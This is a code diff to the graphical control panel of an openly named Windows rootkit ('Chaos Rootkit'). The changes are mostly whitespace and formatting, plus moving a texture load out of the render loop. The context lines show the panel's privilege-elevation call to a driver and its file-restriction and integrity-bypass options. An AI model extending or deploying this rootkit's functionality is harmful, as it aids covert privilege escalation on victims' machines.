@@ -256,6 +256,7 @@ int main(int, char**)
     bool all_windows = false;
     int pid = 0;
     ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
+    Texture	tex = readTextureFile();
 
 #ifdef __EMSCRIPTEN__
     io.IniFilename = nullptr;
@@ -272,7 +273,6 @@ int main(int, char**)
         ImGui_ImplOpenGL3_NewFrame();
         ImGui_ImplGlfw_NewFrame();
         ImGui::NewFrame();
-        Texture	tex = readTextureFile();
         if (show_demo_window)
             ImGui::ShowDemoWindow(&show_demo_window);
         {
@@ -498,7 +498,7 @@ int main(int, char**)
             fopera operation_client = { 0 };
             ImGui::Begin("Chaos Rootkit PANEL", &restrict_access_to_file);
 
-            ImGui::InputTextWithHint("##","PID", buf, IM_ARRAYSIZE(buf)); // Added label for InputText
+            ImGui::InputTextWithHint("##", "PID", buf, IM_ARRAYSIZE(buf)); // Added label for InputText
 
 
             ImGui::InputTextWithHint("###", "Filename", filename, IM_ARRAYSIZE(filename));
@@ -553,7 +553,7 @@ int main(int, char**)
         {
             if (restrict_access_to_file == 1)
             {
-                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.",0,0);
+                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", 0, 0);
                 restrict_access_to_file = 0;
             }
             fopera operation_client = { 0 };
@@ -613,7 +613,7 @@ int main(int, char**)
             {
                 if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&currentPid, sizeof(currentPid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                 {
-                    
+
                     component_color_handler = 2;
                     if (!lpBytesReturned)
                     {
